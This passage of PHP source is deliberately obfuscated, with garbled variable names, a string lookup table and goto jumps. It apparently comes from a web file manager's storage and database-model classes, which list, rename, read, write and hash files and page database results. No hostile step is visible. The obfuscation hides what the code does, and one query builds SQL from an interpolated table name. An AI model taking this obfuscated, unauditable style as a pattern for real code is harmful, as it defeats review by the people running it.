$»ª­¼ª¬ =& $_SERVER[É¨™èà]; $ÎúÏÑ’˜ = $this->fileNameAuto($this->pathFather($½ëÀŸ˜), $Ññ¥æœ); $ÎúÏÑ’˜ = $this->iconvSystem($ÎúÏÑ’˜); $½ëÀŸ˜ = $this->iconvSystem($½ëÀŸ˜); $úõØÀãŒ = $this->pathFather($½ëÀŸ˜); $æÖ¿´‡ = rtrim($úõØÀãŒ, $»ª­¼ª¬[8]) . $»ª­¼ª¬[8] . $ÎúÏÑ’˜; $áÑøòƒÉ = @rename($½ëÀŸ˜, $æÖ¿´‡); $æÖ¿´‡ = $this->iconvApp($æÖ¿´‡); if ($áÑøòƒÉ) { return $this->getPathOuter($æÖ¿´‡); } $this->writeLog(__FUNCTION__ . $»ª­¼ª¬[1479], !0); return !1; } public function size($Şğê‚ÀÒ) { $Şğê‚ÀÒ = $this->iconvSystem($Şğê‚ÀÒ); return filesize_64($Şğê‚ÀÒ); } public function info($æ´êşºÖ) { $æ´êşºÖ = $this->iconvSystem($æ´êşºÖ); if ($this->isFolder($æ´êşºÖ)) { return $this->folderInfo($æ´êşºÖ); } else { if ($this->isFile($æ´êşºÖ)) { return $this->fileInfo($æ´êşºÖ); } } return !1; } protected function infoChildren($ôŞÍôùˆ, &$æ³ˆÖÄ©, $úœ„¦¾¯ = true) { $ÂÌ¯¡Œ“ =& $_SERVER[É¨™èà]; check_abort_echo(); $ôŞÍôùˆ = rtrim($ôŞÍôùˆ, $ÂÌ¯¡Œ“[8]) . $ÂÌ¯¡Œ“[8]; if ($úœ„¦¾¯) { $ôŞÍôùˆ = $this->iconvSystem($ôŞÍôùˆ); } if (!($Ã†¾¸ßò = @opendir($ôŞÍôùˆ))) { return; } while (($–æĞÊ­‡ = readdir($Ã†¾¸ßò)) !== !1) { if ($–æĞÊ­‡ == $ÂÌ¯¡Œ“[10] || $–æĞÊ­‡ == $ÂÌ¯¡Œ“[1383]) { continue; } $èÙø¡Æ¯ = $ôŞÍôùˆ . $–æĞÊ­‡; if (is_file($èÙø¡Æ¯) || is_link($èÙø¡Æ¯)) { $æ³ˆÖÄ©[$ÂÌ¯¡Œ“[80]]++; $æ³ˆÖÄ©[$ÂÌ¯¡Œ“[79]] += filesize_64($èÙø¡Æ¯); } else { if (is_dir($èÙø¡Æ¯)) { $æ³ˆÖÄ©[$ÂÌ¯¡Œ“[81]]++; $this->infoChildren($èÙø¡Æ¯, $æ³ˆÖÄ©, !1); } } } closedir($Ã†¾¸ßò); } private function folderInfo($©ñêøôê, $ì¿åæßì = false) { $ıÄµÇî„ =& $_SERVER[É¨™èà]; $©ñêøôê = rtrim($©ñêøôê, $ıÄµÇî„[8]) . $ıÄµÇî„[8]; $ŠöŠúÇ = $this->iconvApp($this->pathThis($©ñêøôê)); if ($ì¿åæßì) { return array($ıÄµÇî„[32] => $ŠöŠúÇ, $ıÄµÇî„[87] => $this->getPathOuter($©ñêøôê), $ıÄµÇî„[33] => $ıÄµÇî„[78]); } $ÕÛ¥­á² = array($ıÄµÇî„[32] => $ŠöŠúÇ, $ıÄµÇî„[87] => $this->getPathOuter($©ñêøôê), $ıÄµÇî„[33] => $ıÄµÇî„[78], $ıÄµÇî„[234] => @filectime($©ñêøôê), $ıÄµÇî„[88] => @filemtime($©ñêøôê), $ıÄµÇî„[1483] => @fileatime($©ñêøôê), $ıÄµÇî„[1484] => is_readable($©ñêøôê), $ıÄµÇî„[1485] => is_writable($©ñêøôê), $ıÄµÇî„[1486] => get_mode($©ñêøôê)); return $ÕÛ¥­á²; } private function fileInfo($·ÊÇøüß, $›ò¿™Û = false) { $–©°Ïİ =& $_SERVER[É¨™èà]; $Æ¦³í‰Ç = $this->iconvApp($this->pathThis($·ÊÇøüß)); if ($›ò¿™Û) { return array($–©°Ïİ[32] => $Æ¦³í‰Ç, $–©°Ïİ[87] => $this->getPathOuter($·ÊÇøüß), $–©°Ïİ[33] => $–©°Ïİ[233], $–©°Ïİ[79] => $this->size($·ÊÇøüß), $–©°Ïİ[169] => $this->ext($Æ¦³í‰Ç)); } $«¥®ô  = array($–©°Ïİ[32] => $Æ¦³í‰Ç, $–©°Ïİ[87] => $this->getPathOuter($·ÊÇøüß), $–©°Ïİ[33] => $–©°Ïİ[233], $–©°Ïİ[234] => @filectime($·ÊÇøüß), $–©°Ïİ[88] => @filemtime($·ÊÇøüß), $–©°Ïİ[1483] => @fileatime($·ÊÇøüß), $–©°Ïİ[79] => $this->size($·ÊÇøüß), $–©°Ïİ[169] => $this->ext($Æ¦³í‰Ç), $–©°Ïİ[1484] => is_readable($·ÊÇøüß), $–©°Ïİ[1485] => is_writable($·ÊÇøüß), $–©°Ïİ[1486] => get_mode($·ÊÇøüß)); return $«¥®ô ; } public function exist($í¼¡—´¶) { $í¼¡—´¶ = $this->iconvSystem($í¼¡—´¶); return @file_exists($í¼¡—´¶); } public function isFile($¸ëåæÍ) { $¸ëåæÍ = $this->iconvSystem($¸ëåæÍ); return @is_file($¸ëåæÍ); } public function isFolder($¿ç¹âå°) { $¿ç¹âå° = $this->iconvSystem($¿ç¹âå°); return @is_dir($¿ç¹âå°); } public function listPath($¼£¶Æ‰Ü, $ìÖãËŞØ = false) { $Ü–‰÷ıŞ =& $_SERVER[É¨™èà]; $¼£¶Æ‰Ü = $this->iconvSystem($¼£¶Æ‰Ü); $¼£¶Æ‰Ü = rtrim($¼£¶Æ‰Ü, $Ü–‰÷ıŞ[8]) . $Ü–‰÷ıŞ[8]; $›ŠŞØšÕ = array($Ü–‰÷ıŞ[85] => array(), $Ü–‰÷ıŞ[86] => array()); if (!($ÇğáÄÅ = @opendir($¼£¶Æ‰Ü))) { return $›ŠŞØšÕ; } while (($ã£–«ä = readdir($ÇğáÄÅ)) !== !1) { if ($ã£–«ä == $Ü–‰÷ıŞ[10] || $ã£–«ä == $Ü–‰÷ıŞ[1383]) { continue; } $ºÕ·±ĞÖ = $¼£¶Æ‰Ü . $ã£–«ä; if (is_file($ºÕ·±ĞÖ)) { $›ŠŞØšÕ[$Ü–‰÷ıŞ[86]][] = $this->fileInfo($ºÕ·±ĞÖ, $ìÖãËŞØ); } else { $›ŠŞØšÕ[$Ü–‰÷ıŞ[85]][] = $this->folderInfo($ºÕ·±ĞÖ, $ìÖãËŞØ); } } closedir($ÇğáÄÅ); return $›ŠŞØšÕ; } public function listAll($´¹Œúı’, &$‚öòãøß = array()) { $Î‡½î¤ =& $_SERVER[É¨™èà]; $´¹Œúı’ = $this->iconvSystem($´¹Œúı’); $´¹Œúı’ = rtrim($´¹Œúı’, $Î‡½î¤[8]) . $Î‡½î¤[8]; if (!($ã•óâ¡Û = @opendir($´¹Œúı’))) { return $‚öòãøß; } while (($çùõŠ = readdir($ã•óâ¡Û)) !== !1) { if ($çùõŠ == $Î‡½î¤[10] || $çùõŠ == $Î‡½î¤[1383]) { continue; } $¶Ø¡úæû = $´¹Œúı’ . $çùõŠ; $¦°¡ĞÄ = is_dir($¶Ø¡úæû) && !is_link($¶Ø¡úæû) ? 1 : 0; $¶Ø¡úæû = $¦°¡ĞÄ ? $¶Ø¡úæû . $Î‡½î¤[8] : $¶Ø¡úæû; $‚öòãøß[] = array($Î‡½î¤[87] => $this->getPathOuter($¶Ø¡úæû), $Î‡½î¤[78] => $¦°¡ĞÄ, $Î‡½î¤[88] => intval(@filemtime($¶Ø¡úæû)), $Î‡½î¤[79] => $¦°¡ĞÄ ? 0 : intval($this->size($¶Ø¡úæû))); if ($¦°¡ĞÄ) { $this->listAll($¶Ø¡úæû, $‚öòãøß); } } closedir($ã•óâ¡Û); return $‚öòãøß; } public function has($Èòóœ¥›, $›­…Æí˜ = false, $Ìı¹õ‰˜ = true) { $šúÍ‹Ù =& $_SERVER[É¨™èà]; $Èòóœ¥› = $this->iconvSystem($Èòóœ¥›); $Èòóœ¥› = rtrim($Èòóœ¥›, $šúÍ‹Ù[8]) . $šúÍ‹Ù[8]; if (!($€°¦¼êò = @opendir($Èòóœ¥›))) { return !1; } $üğ²Î¬º = 0; $½øÜøãĞ = 0; $ÙŞÀç—… = 0; while (($ï‰÷œİÂ = readdir($€°¦¼êò)) !== !1) { if ($ï‰÷œİÂ == $šúÍ‹Ù[10] || $ï‰÷œİÂ == $šúÍ‹Ù[1383]) { continue; } $êìŸ’É = $Èòóœ¥› . $ï‰÷œİÂ; if ($›­…Æí˜) { $ÙŞÀç—…++; if (@is_file($êìŸ’É)) { $üğ²Î¬º++; } else { $½øÜøãĞ++; } if ($ÙŞÀç—… > 10000) { break; } continue; } if ($Ìı¹õ‰˜) { if (@is_file($êìŸ’É)) { return !0; } } else { if (@is_dir($êìŸ’É . $šúÍ‹Ù[8])) { return !0; } } } closedir($€°¦¼êò); if ($›­…Æí˜) { return array($šúÍ‹Ù[242] => $üğ²Î¬º, $šúÍ‹Ù[243] => $½øÜøãĞ); } return !1; } public function hashSimple($Ü¹æ¯êá) { $şÊ·şîº =& $_SERVER[É¨™èà]; if (!$Ü¹æ¯êá) { return md5($şÊ·şîº[12]); } $Ü¹æ¯êá = $this->iconvSystem($Ü¹æ¯êá); $ÎÒ›ÈÌò = $this->size($Ü¹æ¯êá); $€óé‰â» = 200; $Ø©­³ÒÆ = 50; if ($ÎÒ›ÈÌò <= $€óé‰â» * $Ø©­³ÒÆ) { return $this->hashMd5($Ü¹æ¯êá) . $ÎÒ›ÈÌò; } $ìäæ‰Ş = $şÊ·şîº[12]; $ê’Ğç…‰ = intval($ÎÒ›ÈÌò / $Ø©­³ÒÆ); $˜ÙµÔ†ë = fopen($Ü¹æ¯êá, $şÊ·şîº[1487]); if (!$˜ÙµÔ†ë) { return $ìäæ‰Ş; } for ($ ê¨ĞÎ‡ = 0; $ ê¨ĞÎ‡ < $Ø©­³ÒÆ; $ ê¨ĞÎ‡++) { fseek_64($˜ÙµÔ†ë, $ê’Ğç…‰ * $ ê¨ĞÎ‡); $ìäæ‰Ş .= fread($˜ÙµÔ†ë, $€óé‰â»); } fseek_64($˜ÙµÔ†ë, $ÎÒ›ÈÌò - $€óé‰â»); $ìäæ‰Ş .= fread($˜ÙµÔ†ë, $€óé‰â»); fclose($˜ÙµÔ†ë); return md5($ìäæ‰Ş) . $ÎÒ›ÈÌò; } public function getContent($ÕÀº¸é¤) { $ÕÀº¸é¤ = $this->iconvSystem($ÕÀº¸é¤); return file_get_contents($ÕÀº¸é¤); } public function setContent($ÊúÓ×Ş, $•øĞ³ô’ = '') { $ÊúÓ×Ş = $this->iconvSystem($ÊúÓ×Ş); $ÚÛáşø = @file_put_contents($ÊúÓ×Ş, $•øĞ³ô’, LOCK_EX); if (!$ÚÛáşø) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][1479], !0); } clearstatcache(); @chmod($ÊúÓ×Ş, $this->pathAuth); return $ÚÛáşø === !1 ? !1 : !0; } public function fileSubstr($–×àæ¾, $Òî†ø¡ = 0, $™Ã••› = false) { $Ê‹Ê¥™ =& $_SERVER[É¨™èà]; $–×àæ¾ = $this->iconvSystem($–×àæ¾); if ($™Ã••› === !1) { $™Ã••› = $this->size($–×àæ¾); } if ($™Ã••› <= 0) { return $Ê‹Ê¥™[12]; } $““×¼…¹ = fopen($–×àæ¾, $Ê‹Ê¥™[1487]); if (!$““×¼…¹) { return !1; } fseek_64($““×¼…¹, $Òî†ø¡); $Õ·ëíÇ = fread($““×¼…¹, $™Ã••›); fclose($““×¼…¹); if (!$Õ·ëíÇ) { $this->writeLog(__FUNCTION__ . $Ê‹Ê¥™[1479], !0); } return $Õ·ëíÇ; } public function upload($ïìÊÏƒ, $—Ùæ×¹, $ˆùşºÀ´ = false, $ƒüØ³˜À = REPEAT_REPLACE) { if ($ˆùşºÀ´) { return $this->moveFile($—Ùæ×¹, $ïìÊÏƒ); } return $this->copyFile($—Ùæ×¹, $ïìÊÏƒ); } public function setModifyTime($ß¸·ÏÍ, $€Äƒ››ú = '') { @touch($ß¸·ÏÍ, intval($€Äƒ››ú)); } public function download($ÏÈşû, $ƒª çëÔ) { return $this->iconvSystem($ÏÈşû); } } goto c¦÷µö¤ã; B§ã¥¿—ˆ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\171\124\151\155\x65", "\x74\x69\155\145", "\x69\156\x73\145\162\164\54\165\x70\x64\x61\164\x65", "\x66\165\x6e\143\164\x69\157\x6e"), array("\x63\162\145\x61\x74\145\124\151\155\x65", "\x74\151\x6d\145", "\151\156\163\145\x72\x74", "\146\165\x6e\143\164\x69\157\x6e")); public function setDataAuto($ë÷ƒ©Ç–) { $this->dataAuto = $ë÷ƒ©Ç–; } public function __construct($„ÂÎ³Æ = '', $¿êŒ‘Ú· = '', $ã€¹¡å = '') { parent::__construct($„ÂÎ³Æ, $¿êŒ‘Ú·, $ã€¹¡å); } protected $tableMeta = array(); protected function _beforeInsert(&$ãÕŠÉ–, $¹½ÏĞÍÍ) { $€¯êğ =& $_SERVER[É¨™èà]; if (!$this->checkDataAutoHas($€¯êğ[441])) { return; } $this->dataBeforeFilter($ãÕŠÉ–, $€¯êğ[441]); } protected function _beforeUpdate(&$†»Şö–©, $¬±Åí÷) { $Ç£–†Ê =& $_SERVER[É¨™èà]; if (!$this->checkDataAutoHas($Ç£–†Ê[442])) { return; } $this->dataBeforeFilter($†»Şö–©, $Ç£–†Ê[442]); } protected function _afterSelect(&$â¯Æóåà, $¼Úæïæ§) { if (!is_array($â¯Æóåà)) { return; } if (!$this->checkDataAutoHas($_SERVER[É¨™èà][443])) { return; } foreach ($â¯Æóåà as &$äÆ‰ú¡Ô) { $this->dataAfterFilter($äÆ‰ú¡Ô); } unset($äÆ‰ú¡Ô); } protected function _afterFind(&$×‚“Èïƒ, $ßËÈ—üô) { if (!is_array($×‚“Èïƒ)) { return; } if (!$this->checkDataAutoHas($_SERVER[É¨™èà][443])) { return; } $this->dataAfterFilter($×‚“Èïƒ); } public static function textEncode($¨Ã‘µ·è) { if (!$¨Ã‘µ·è) { return $¨Ã‘µ·è; } $·âÛÖ· = json_encode($¨Ã‘µ·è); $·âÛÖ· = preg_replace_callback($_SERVER[É¨™èà][444], function ($ãèæŒõ‰) { return addslashes($ãèæŒõ‰[0]); }, $·âÛÖ·); return json_decode($·âÛÖ·); } public static function textDecode($…±¢¹á) { $¦ÀØ‚í =& $_SERVER[É¨™èà]; $£€â¾¶ = json_encode($…±¢¹á); $£€â¾¶ = preg_replace_callback($¦ÀØ‚í[445], function ($ÓİıèâŸ) { return $_SERVER[É¨™èà][100]; }, $£€â¾¶); return json_decode($£€â¾¶); } public function setAutoIncrement($Ñ–‘¤ñ) { $’ƒ†‡ô = array($this->getPk() => $Ñ–‘¤ñ); $úŠ£Úõæ = $this->data($’ƒ†‡ô)->add(); if ($úŠ£Úõæ) { $this->delete($úŠ£Úõæ); } } public function getAutoIncrement() { $‡ÏúÓ²å = $this->getTableName(); $ƒ£Â‘´µ = $this->max($this->getPk()); $ªÍóÖÎÃ = $this->query("\163\x68\157\167\40\164\x61\142\154\145\x20\163\164\141\x74\x75\163\x20\x77\x68\145\162\x65\x20\x4e\141\155\145\75\x27{$‡ÏúÓ²å}\47"); $ãƒ¦‹Ú² = $ªÍóÖÎÃ[0][$_SERVER[É¨™èà][446]]; $§‘ı»Ï = max($ƒ£Â‘´µ, $ãƒ¦‹Ú²); return $§‘ı»Ï; } protected function _callBefore($ûî„ØÑ, $‘¹´¼“É) { return $this->cacheCallCheck($ûî„ØÑ, $‘¹´¼“É, !1); } protected function _callAfter($·Œ¥ıû¦, $”­‡æüá) { return $this->cacheCallCheck($·Œ¥ıû¦, $”­‡æüá, !0); } protected function cacheFunctionAlias($À·Çê¡·) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Ï´¥©Òõ, $ÖŠ»‡Ÿâ, $À¼äû…ˆ = false) { $‰úÂèŞĞ =& $_SERVER[É¨™èà]; $íã†ÀÁ = $this->cacheFunctionAlias($ÖŠ»‡Ÿâ); if (!$íã†ÀÁ) { return; } foreach ($íã†ÀÁ as $æ“üÂ£¿ => $·ä…¥Ô) { $–ºéş‰ = $·ä…¥Ô[0]; $³£Ó = explode($‰úÂèŞĞ[50], $·ä…¥Ô[1]); $‘¸¤å = isset($·ä…¥Ô[2]) ? $·ä…¥Ô[2] : $‰úÂèŞĞ[12]; if ($Ï´¥©Òõ == $æ“üÂ£¿) { return $this->cacheFunctionGet($æ“üÂ£¿, $–ºéş‰, $‘¸¤å); } if ($À¼äû…ˆ && in_array($Ï´¥©Òõ, $³£Ó)) { $this->cacheFunctionClear($æ“üÂ£¿, $–ºéş‰, $‘¸¤å); } } } public function cacheFunctionGet($ÎÁˆîî½, $…àçÍ³„, $›¼ù«ÌÆ = '') { $ûò´¤¥¬ = $this->cacheKeyMake($ÎÁˆîî½, $…àçÍ³„, $›¼ù«ÌÆ); $ü¶½©à² = Cache::get($ûò´¤¥¬); if (!is_array($ü¶½©à²)) { $ü¶½©à² = call_user_func_array(array($this, $ÎÁˆîî½), array($…àçÍ³„, !0)); Cache::set($ûò´¤¥¬, $ü¶½©à²); } return $ü¶½©à²; } public function cacheFunctionClear($ÆÑ¬‘ù§, $¯Ã­…ê, $‰µœ’· = '') { $ÄîÀëû = $¯Ã­…ê; if (!is_array($¯Ã­…ê)) { $ÄîÀëû = array($¯Ã­…ê); } foreach ($ÄîÀëû as $Ãıá»”…) { $óËĞáÊ– = $this->cacheKeyMake($ÆÑ¬‘ù§, $Ãıá»”…, $‰µœ’·); Cache::remove($óËĞáÊ–); } } public function cacheKeyMake($½´›àªë, $Îâ„¦Ü, $“†‚ó¼¼) { $ß¢ÏŞ†ñ =& $_SERVER[É¨™èà]; if ($“†‚ó¼¼) { $Îâ„¦Ü = $Îâ„¦Ü . $ß¢ÏŞ†ñ[447] . $“†‚ó¼¼; } return get_class($this) . $ß¢ÏŞ†ñ[11] . $½´›àªë . $ß¢ÏŞ†ñ[448] . $Îâ„¦Ü; } protected function selectPageReset() { $¾î–Ïø¼ =& $_SERVER[É¨™èà]; if (isset($GLOBALS[$¾î–Ïø¼[449]])) { return; } $GLOBALS[$¾î–Ïø¼[449]] = isset($GLOBALS[$¾î–Ïø¼[7]][$¾î–Ïø¼[450]]) ? $GLOBALS[$¾î–Ïø¼[7]][$¾î–Ïø¼[450]] : !1; $GLOBALS[$¾î–Ïø¼[451]] = isset($GLOBALS[$¾î–Ïø¼[7]][$¾î–Ïø¼[439]]) ? $GLOBALS[$¾î–Ïø¼[7]][$¾î–Ïø¼[439]] : !1; $GLOBALS[$¾î–Ïø¼[7]][$¾î–Ïø¼[450]] = !1; $GLOBALS[$¾î–Ïø¼[7]][$¾î–Ïø¼[439]] = !1; } protected function selectPageRestore() { $²Ç­ñº =& $_SERVER[É¨™èà]; if (!isset($GLOBALS[$²Ç­ñº[449]])) { return; } $GLOBALS[$²Ç­ñº[7]][$²Ç­ñº[450]] = $GLOBALS[$²Ç­ñº[449]]; $GLOBALS[$²Ç­ñº[7]][$²Ç­ñº[439]] = $GLOBALS[$²Ç­ñº[451]]; if ($GLOBALS[$²Ç­ñº[7]][$²Ç­ñº[450]] === !1) { unset($GLOBALS[$²Ç­ñº[7]][$²Ç­ñº[450]]); } if ($GLOBALS[$²Ç­ñº[7]][$²Ç­ñº[439]] === !1) { unset($GLOBALS[$²Ç­ñº[7]][$²Ç­ñº[439]]); } unset($GLOBALS[$²Ç­ñº[449]]); unset($GLOBALS[$²Ç­ñº[451]]); } protected function selectPage($Å¬šÂ¥… = 200, $ÂĞ‡— = 1) { $ªÍÊ²­ =& $_SERVER[É¨™èà]; global $in; $³âÙ²¬õ = $this->optionsValue(); $Ï©´úğ“ = 50000; $Å¬šÂ¥… = isset($in[$ªÍÊ²­[450]]) && $in[$ªÍÊ²­[450]] ? $in[$ªÍÊ²­[450]] : $Å¬šÂ¥…; if ($Å¬šÂ¥… === -1) { $in[$ªÍÊ²­[450]] = !1; $Ï©´úğ“ = 100000000; $Å¬šÂ¥… = $Ï©´úğ“; } $öÜ”Õã = $³âÙ²¬õ; $öÜ”Õã[$ªÍÊ²­[452]] = array(); $Å¬šÂ¥… = intval($Å¬šÂ¥…); $Å¬šÂ¥… = $Å¬šÂ¥… <= 5 ? 5 : ($Å¬šÂ¥… >= $Ï©´úğ“ ? $Ï©´úğ“ : $Å¬šÂ¥…); $ÂĞ‡— = intval(isset($in[$ªÍÊ²­[439]]) && $in[$ªÍÊ²­[439]] ? $in[$ªÍÊ²­[439]] : $ÂĞ‡—); $ÂĞ‡— = $ÂĞ‡— <= 1 ? 1 : $ÂĞ‡—; $æù¶×ò» = array(); $Ò¼›Ç± = 1; if ($ÂĞ‡— == 1 && $Ò¼›Ç±) { $this->optionsValue($³âÙ²¬õ); $æù¶×ò» = $this->page($ÂĞ‡—, $Å¬šÂ¥…)->select(); $†ê«ğÀ¡ = is_array($æù¶×ò») ? count($æù¶×ò») : 0; if ($†ê«ğÀ¡ < $Å¬šÂ¥…) { $Åãƒ±šü = 1; } else { $this->optionsValue($öÜ”Õã); $†ê«ğÀ¡ = intval($this->count()); $Åãƒ±šü = ceil($†ê«ğÀ¡ / $Å¬šÂ¥…); } } else { $this->optionsValue($öÜ”Õã); $†ê«ğÀ¡ = intval($this->count()); $Åãƒ±šü = ceil($†ê«ğÀ¡ / $Å¬šÂ¥…); $ÂĞ‡— = $ÂĞ‡— >= $Åãƒ±šü ? $Åãƒ±šü : $ÂĞ‡—; $this->optionsValue($³âÙ²¬õ); $æù¶×ò» = $this->page($ÂĞ‡—, $Å¬šÂ¥…)->select(); } if (!is_array($æù¶×ò»)) { $æù¶×ò» = array(); } if ($Åãƒ±šü == 1) { $†ê«ğÀ¡ = count($æù¶×ò»); } $Ì‘×ìâ = array($ªÍÊ²­[453] => array($ªÍÊ²­[454] => $†ê«ğÀ¡, $ªÍÊ²­[450] => $Å¬šÂ¥…, $ªÍÊ²­[439] => $ÂĞ‡—, $ªÍÊ²­[455] => $Åãƒ±šü), $ªÍÊ²­[456] => $æù¶×ò»); return $Ì‘×ìâ; } protected function checkLength($òèÚìü, $†×ÑÃˆÃ = 0, $‹º×‘•ò = '') { $Ùê£Ï˜ô =& $_SERVER[É¨™èà]; $†×ÑÃˆÃ = $†×ÑÃˆÃ ? $†×ÑÃˆÃ : 65536; if (!$òèÚìü || strlen($òèÚìü) < $†×ÑÃˆÃ) { return; } $‹º×‘•ò = $‹º×‘•ò ? $‹º×‘•ò . $Ùê£Ï˜ô[74] : $Ùê£Ï˜ô[12]; show_json($‹º×‘•ò . LNG($Ùê£Ï˜ô[457]) . "\50{$†×ÑÃˆÃ}\51", !1); } protected function metaSet($¿ıñ—Í‘, $Í×Øóı± = null, $º¥ÈÊ÷¦ = null) { $î½Â¥ëù =& $_SERVER[É¨™èà]; if (!$this->tableMeta || !$¿ıñ—Í‘) { return !1; } $İÀĞ¯Õœ = $this->tableMeta[$î½Â¥ëù[458]]; $¼Îƒ¯¤Ò = $this->tableMeta[$î½Â¥ëù[459]]; $ “£ã”Ì = Model($¼Îƒ¯¤Ò); $µ·ß…üÄ = array($İÀĞ¯Õœ => $¿ıñ—Í‘, $î½Â¥ëù[460] => $Í×Øóı±); if (is_null($Í×Øóı±)) { return $ “£ã”Ì->where(array($İÀĞ¯Õœ => $¿ıñ—Í‘))->delete(); } if (is_null($º¥ÈÊ÷¦) && is_string($Í×Øóı±)) { return $ “£ã”Ì->where($µ·ß…üÄ)->delete(); } $«æûö¶… = is_array($Í×Øóı±) ? $Í×Øóı± : array(); if (is_string($Í×Øóı±)) { $«æûö¶…[$Í×Øóı±] = $º¥ÈÊ÷¦; } $Şñš”’ï = array(); foreach ($«æûö¶… as $ä×í¬É => $ÃâÎöıš) { if (is_null($ÃâÎöıš) && is_string($ä×í¬É)) { $ “£ã”Ì->where(array($İÀĞ¯Õœ => $¿ıñ—Í‘, $î½Â¥ëù[460] => $ä×í¬É))->delete(); continue; } $this->checkLength($ÃâÎöıš, !1, $¼Îƒ¯¤Ò . $î½Â¥ëù[4] . $ä×í¬É); $Şñš”’ï[] = array($İÀĞ¯Õœ => $¿ıñ—Í‘, $î½Â¥ëù[97] => $ä×í¬É, $î½Â¥ëù[461] => $ÃâÎöıš); } $©ÂøÎŸ = $î½Â¥ëù[462] . $¼Îƒ¯¤Ò; CacheLock::lock($©ÂøÎŸ); $ “£ã”Ì->where(array($İÀĞ¯Õœ => $¿ıñ—Í‘))->addAll($Şñš”’ï, array(), !0); CacheLock::unlock($©ÂøÎŸ); return !0; } public function metaGet($õ¦ìÅÖş, $³½˜§ = false) { $Ùòîòâ =& $_SERVER[É¨™èà]; if (!$this->tableMeta) { return array(); } $Šæ÷†íÌ = $this->tableMeta[$Ùòîòâ[458]]; $ş›¼×§ = Model($this->tableMeta[$Ùòîòâ[459]]); if ($³½˜§) { $‘÷ñ½ûò = array($Šæ÷†íÌ => $õ¦ìÅÖş, $Ùòîòâ[97] => $³½˜§); return $ş›¼×§->where($‘÷ñ½ûò)->getField($Ùòîòâ[461]); } $‘÷ñ½ûò = array($Šæ÷†íÌ => $õ¦ìÅÖş); $ÄÁ°û¼ã = $ş›¼×§->field($Ùòîòâ[463])->where($‘÷ñ½ûò)->select(); $ÄÁ°û¼ã = array_to_keyvalue($ÄÁ°û¼ã, $Ùòîòâ[97], $Ùòîòâ[461]); return $ÄÁ°û¼ã; } private function checkDataAutoHas($ñÂ—ÈÉÔ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $üé”ñï·) { if (in_array($ñÂ—ÈÉÔ, explode($_SERVER[É¨™èà][50], $üé”ñï·[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ËÊŸÇ·, $ìø«½É) { $Üœì¾± =& $_SERVER[É¨™èà]; if (!is_array($ËÊŸÇ·)) { return; } foreach ($this->dataAuto as $ûÂĞ’êõ) { $Ú·„§Á = $ûÂĞ’êõ[0]; if (!in_array($ìø«½É, explode($Üœì¾±[50], $ûÂĞ’êõ[2]))) { continue; } switch (trim($ûÂĞ’êõ[3])) { case $Üœì¾±[407]: case $Üœì¾±[408]: $Ü§‘Æ–Š = $ûÂĞ’êõ[1]; $³Î£¶¼© = isset($ûÂĞ’êõ[4]) ? (array) $ûÂĞ’êõ[4] : array(); if ($Ü§‘Æ–Š == $Üœì¾±[207] && array_key_exists($Ú·„§Á, $ËÊŸÇ·)) { if (!$ËÊŸÇ·[$Ú·„§Á]) { unset($ËÊŸÇ·[$Ú·„§Á]); } break; } if (isset($ËÊŸÇ·[$Ú·„§Á])) { array_unshift($³Î£¶¼©, $ËÊŸÇ·[$Ú·„§Á]); } if ($Üœì¾±[407] == $ûÂĞ’êõ[3]) { $ËÊŸÇ·[$Ú·„§Á] = call_user_func_array($Ü§‘Æ–Š, $³Î£¶¼©); } else { $ËÊŸÇ·[$Ú·„§Á] = call_user_func_array(array(&$this, $Ü§‘Æ–Š), $³Î£¶¼©); } break; case $Üœì¾±[359]: if (isset($ËÊŸÇ·[$Ú·„§Á]) && $ËÊŸÇ·[$Ú·„§Á]) { $ËÊŸÇ·[$Ú·„§Á] = call_user_func_array(array(&$this, $ûÂĞ’êõ[1]), array($ËÊŸÇ·[$Ú·„§Á])); } break; case $Üœì¾±[362]: $ËÊŸÇ·[$Ú·„§Á] = $ËÊŸÇ·[$ûÂĞ’êõ[1]]; break; case $Üœì¾±[380]: if (isset($ËÊŸÇ·[$Ú·„§Á]) && !is_string($ËÊŸÇ·[$Ú·„§Á])) { $ËÊŸÇ·[$Ú·„§Á] = json_encode_force($ËÊŸÇ·[$Ú·„§Á]); } break; case $Üœì¾±[409]: if ($ËÊŸÇ·[$Ú·„§Á] === $Üœì¾±[12]) { unset($ËÊŸÇ·[$Ú·„§Á]); } break; case $Üœì¾±[410]: $ËÊŸÇ·[$Ú·„§Á] = $ûÂĞ’êõ[1]; default: break; } } if ($ìø«½É == $Üœì¾±[441]) { $õÏªŞ» = strtolower($this->db->getDbType()); if (strpos($õÏªŞ», $Üœì¾±[13]) !== 0) { return; } $„„µ£—† = $this->field(!0)->fields; $ŸË‹ßº” = $„„µ£—†[$Üœì¾±[341]]; if (isset($„„µ£—†[$Üœì¾±[340]])) { unset($ŸË‹ßº”[$„„µ£—†[$Üœì¾±[340]]]); } foreach ($ŸË‹ßº” as $¥¯ñáı => $ìø«½É) { if (!isset($ËÊŸÇ·[$¥¯ñáı])) { $ËÊŸÇ·[$¥¯ñáı] = $Üœì¾±[12]; } } } } private function dataAfterFilter(&$ó«Îü±ˆ) { $‘Ö¾ëˆ¯ =& $_SERVER[É¨™èà]; foreach ($this->dataAuto as $©Ç µÓß) { $˜˜„®– = $©Ç µÓß[0]; if (!isset($ó«Îü±ˆ[$˜˜„®–])) { continue; } if (!in_array($‘Ö¾ëˆ¯[443], explode($‘Ö¾ëˆ¯[50], $©Ç µÓß[2]))) { continue; } switch (trim($©Ç µÓß[3])) { case $‘Ö¾ëˆ¯[407]: case $‘Ö¾ëˆ¯[408]: $«âï²÷» = isset($©Ç µÓß[4]) ? (array) $©Ç µÓß[4] : array(); array_unshift($«âï²÷», $ó«Îü±ˆ[$˜˜„®–]); if (isset($©Ç µÓß[4]) && $©Ç µÓß[4] == $‘Ö¾ëˆ¯[464]) { $«âï²÷» = array($ó«Îü±ˆ[$˜˜„®–]); } if ($‘Ö¾ëˆ¯[407] == $©Ç µÓß[3]) { $ó«Îü±ˆ[$˜˜„®–] = call_user_func_array($©Ç µÓß[1], $«âï²÷»); } else { $ó«Îü±ˆ[$˜˜„®–] = call_user_func_array(array(&$this, $©Ç µÓß[1]), $«âï²÷»); } break; case 